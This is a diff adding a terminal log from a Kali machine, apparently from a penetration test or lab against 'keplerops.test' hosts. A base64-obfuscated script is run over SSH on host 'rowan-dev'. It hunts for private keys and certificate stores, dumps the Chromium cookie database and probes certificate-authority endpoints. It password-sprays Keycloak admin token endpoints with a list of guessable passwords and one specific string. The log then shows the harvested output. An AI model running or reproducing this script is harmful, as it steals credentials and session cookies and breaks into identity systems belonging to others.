@@ -1,0 +1,52 @@
+└─$ └─$ 
+
+┌──(cinder@kali)-[~]
+└─$ └─$ base64 -d > /tmp/k14_r21.sh <<'B64EOF'
+> c2V0ICtlCnNzaCAtbyBCYXRjaE1vZGU9eWVzIC1vIFN0cmljdEhvc3RLZXlDaGVja2luZz1ubyAtbyBDb25uZWN0VGltZW91dD04IHJvd2FuLWRldiAnYmFzaCAtcycgPDwnUlNIJwpzZXQgK2UKZWNobyAiPT09IENIUk9NSVVNIERJUiA9PT0iCmxzIC1sYSAvaG9tZS9yb3dhbi8uY29uZmlnL2Nocm9taXVtL0RlZmF1bHQvIDI+JjEgfCBoZWFkIC00MAplY2hvICI9PT0gTlNTIC8gUEtJIC8gUDEyIC8gS0VZUyA9PT0iCmZpbmQgL2hvbWUvcm93YW4gL2V0YyAvdXNyL2xvY2FsIC1tYXhkZXB0aCA2IFwoIC1pbmFtZSAnY2VydDkuZGInIC1vIC1pbmFtZSAna2V5NC5kYicgLW8gLWluYW1lICcqLnAxMicgLW8gLWluYW1lICcqLnBmeCcgLW8gLWluYW1lICcqY2xpZW50KmtleSonIC1vIC1pbmFtZSAnaWRfKicgXCkgMj4vZGV2L251bGwgfCBncmVwIC12IHJlcG9zIHwgaGVhZCAtNDAKZ3JlcCAtcklsICdCRUdJTiAuKlBSSVZBVEUgS0VZJyAvaG9tZS9yb3dhbiAyPi9kZXYvbnVsbCB8IGhlYWQKZWNobyAiPT09IENPT0tJRVMgPT09IgpweXRob24zIC0gPDwnUFknCmltcG9ydCBzcWxpdGUzLHNodXRpbAp0cnk6CiAgICBzaHV0aWwuY29weSgnL2hvbWUvcm93YW4vLmNvbmZpZy9jaHJvbWl1bS9EZWZhdWx0L0Nvb2tpZXMnLCcvdG1wL2MuZGInKQogICAgYz1zcWxpdGUzLmNvbm5lY3QoJy90bXAvYy5kYicpCiAgICBmb3Igcm93IGluIGMuZXhlY3V0ZSgnc2VsZWN0IGhvc3Rfa2V5LG5hbWUsbGVuZ3RoKGVuY3J5cHRlZF92YWx1ZSksc3Vic3RyKGVuY3J5cHRlZF92YWx1ZSwxLDMpLGV4cGlyZXNfdXRjIGZyb20gY29va2llcyBvcmRlciBieSBob3N0X2tleScpOgogICAgICAgIHByaW50KHJvdykKZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOiBwcmludCgnRVJSJyxlKQpQWQplY2hvICI9PT0gQ0EvQ0VSVCBQUk9CRVMgPT09Igpmb3IgSCBpbiBjYSBjZXJ0OyBkbyBmb3IgcCBpbiAvIC9oZWFsdGggL2hlYWx0aHogL3Jvb3RzIC9yb290IC9hcGkgLzEuMC9yb290cyAvdjEvcm9vdHMgLy53ZWxsLWtub3duL2VzdC9jYWNlcnRzIC9hY21lL2RpcmVjdG9yeSAvYXBpL3YxL2NlcnRzIC92ZXJzaW9uOyBkbwogY29kZT0kKGN1cmwgLXNTayAtbSA2IC1vIC90bXAvbyAtdyAnJXtodHRwX2NvZGV9JyAiaHR0cHM6Ly8kSC5rZXBsZXJvcHMudGVzdCRwIik7IGVjaG8gIi0tICRIJHAgLT4gJGNvZGUgOjogJChoZWFkIC1jIDEyMCAvdG1wL298dHIgJ1xuJyAnICcpIgpkb25lOyBkb25lCmVjaG8gIj09PSBLRVlDTE9BSyBBRE1JTiBUT0tFTiBBVFRFTVBUUyA9PT0iCkk9aHR0cHM6Ly9pZGVudGl0eS5rZXBsZXJvcHMudGVzdApmb3IgciBpbiBtYXN0ZXIga2VwbGVyb3BzOyBkbwogZm9yIHUgaW4gYWRtaW4gbWF5YS5yYW5zY29tYmUgcm93YW4uaXRvOyBkbwogIGZvciBwdyBpbiBhZG1pbiBwYXNzd29yZCBrZXBsZXJvcHMgY2hhbmdlbWUgc1dRYTMxMDg1RlRRZWtaaEhUeFV5Zl85RTFtYXJxMHVyOFdOQ0ttVHRuazsgZG8KICAgcjI9JChjdXJsIC1zU2sgLW0gNiAtbyAvdG1wL28gLXcgJyV7aHR0cF9jb2RlfScgLWQgImdyYW50X3R5cGU9cGFzc3dvcmQmY2xpZW50X2lkPWFkbWluLWNsaSZ1c2VybmFtZT0kdSZwYXNzd29yZD0kcHciICIkSS9yZWFsbXMvJHIvcHJvdG9jb2wvb3BlbmlkLWNvbm5lY3QvdG9rZW4iKQogICBvaz0kKGhlYWQgLWMgNjAgL3RtcC9vKQogICBpZiBbICIkcjIiID0gIjIwMCIgXTsgdGhlbiBlY2hvICJTVUNDRVNTIHJlYWxtPSRyIHVzZXI9JHUgcHc9JHB3IDo6ICRvayI7IGNwIC90bXAvbyAvdG1wL2tjXyRyLmpzb247IGZpCiAgZG9uZQogZG9uZQpkb25lCmVjaG8gImRvbmUgYXR0ZW1wdHMiCmVjaG8gIj09PSBLRVlDTE9BSyBUT0tFTiBFWENIQU5HRSBQVUJMSUM/ID09PSIKY3VybCAtc1NrIC1tIDYgLW8gL3RtcC9vIC13ICcle2h0dHBfY29kZX1cbicgLWQgJ2dyYW50X3R5cGU9dXJuOmlldGY6cGFyYW1zOm9hdXRoOmdyYW50LXR5cGU6dG9rZW4tZXhjaGFuZ2UmY2xpZW50X2lkPWFkbWluLWNsaScgIiRJL3JlYWxtcy9rZXBsZXJvcHMvcHJvdG9jb2wvb3BlbmlkLWNvbm5lY3QvdG9rZW4iOyBoZWFkIC1jIDMwMCAvdG1wL287IGVjaG8KZWNobyAiPT09IFVNQTIgPT09IgpjdXJsIC1zU2sgLW0gOCAiJEkvcmVhbG1zL2tlcGxlcm9wcy8ud2VsbC1rbm93bi91bWEyLWNvbmZpZ3VyYXRpb24iIHwgaGVhZCAtYyA2MDA7IGVjaG8KUlNICmVjaG8gRE9ORV9LMTRfUjIxCg==
+> B64EOF
+
+┌──(cinder@kali)-[~]
+└─$ └─$ chmod +x /tmp/k14_r21.sh; bash /tmp/k14_r21.sh; echo DONEMARK_1795201579298$((6*7))
+=== CHROMIUM DIR ===
+total 52
+drwx------ 2 rowan rowan  4096 Nov 19 07:11 .
+drwx------ 3 rowan rowan  4096 Nov 19 07:11 ..
+-rw------- 1 rowan rowan 20480 Nov 19 07:11 Cookies
+-rw------- 1 rowan rowan 20480 Sep 18 11:00 History
+-rw------- 1 rowan rowan   202 Sep 18 11:00 Preferences
+=== NSS / PKI / P12 / KEYS ===
+=== COOKIES ===
+('support.keplerops.test', 'fieldkest_support', 0, None, 13389457320000000)
+=== CA/CERT PROBES ===
+-- ca/ -> 404 :: 404 page not found 
+-- ca/health -> 200 :: {"status":"ok"} 
+-- ca/healthz -> 404 :: 404 page not found 
+-- ca/roots -> 201 :: {"crts":["-----BEGIN CERTIFICATE-----\nMIIB3DCCAYKgAwIBAgIRAN/zqHtc6w8UvxJTEfQDvNwwCgYIKoZIzj0EAwIwTDEg\nMB4GA1UEChMXRml
+-- ca/root -> 404 :: 404 page not found 
+-- ca/api -> 404 :: 404 page not found 
+-- ca/1.0/roots -> 201 :: {"crts":["-----BEGIN CERTIFICATE-----\nMIIB3DCCAYKgAwIBAgIRAN/zqHtc6w8UvxJTEfQDvNwwCgYIKoZIzj0EAwIwTDEg\nMB4GA1UEChMXRml
+-- ca/v1/roots -> 404 :: 404 page not found 
+-- ca/.well-known/est/cacerts -> 404 :: 404 page not found 
+-- ca/acme/directory -> 404 :: 404 page not found 
+-- ca/api/v1/certs -> 404 :: 404 page not found 
+-- ca/version -> 200 :: {"version":"0.28.4"} 
+-- cert/ -> 404 :: 404 page not found 
+-- cert/health -> 200 :: {"status":"ok"} 
+-- cert/healthz -> 404 :: 404 page not found 
+-- cert/roots -> 201 :: {"crts":["-----BEGIN CERTIFICATE-----\nMIIB3DCCAYKgAwIBAgIRAN/zqHtc6w8UvxJTEfQDvNwwCgYIKoZIzj0EAwIwTDEg\nMB4GA1UEChMXRml
+-- cert/root -> 404 :: 404 page not found 
+-- cert/api -> 404 :: 404 page not found 
+-- cert/1.0/roots -> 201 :: {"crts":["-----BEGIN CERTIFICATE-----\nMIIB3DCCAYKgAwIBAgIRAN/zqHtc6w8UvxJTEfQDvNwwCgYIKoZIzj0EAwIwTDEg\nMB4GA1UEChMXRml
+-- cert/v1/roots -> 404 :: 404 page not found 
+-- cert/.well-known/est/cacerts -> 404 :: 404 page not found 
+-- cert/acme/directory -> 404 :: 404 page not found 
+-- cert/api/v1/certs -> 404 :: 404 page not found 
+-- cert/version -> 200 :: {"version":"0.28.4"} 
+=== KEYCLOAK ADMIN TOKEN ATTEMPTS ===
+done attempts
+=== KEYCLOAK TOKEN EXCHANGE PUBLIC? ===
+400
+{"error":"invalid_request","error_description":"Standard token exchange is not enabled for the requested client"}
+=== UMA2 ===
+{"issuer":"https://identity.keplerops.test/realms/keplerops","authorization_endpoint":"https://identity.keplerops.test/realms/keplerops/protocol/openid-connect/auth","token_endpoint":"https://identity.keplerops.test/realms/keplerops/protocol/openid-connect/token","introspection_endpoint":"https://identity.keplerops.test/realms/keplerops/protocol/openid-connect/token/introspect","end_session_endpoint":"https://identity.keplerops.test/realms/keplerops/protocol/openid-connect/logout","frontchannel_logout_session_supported":true,"frontchannel_logout_supported":true,"jwks_uri":"https://identity.kep
+DONE_K14_R21
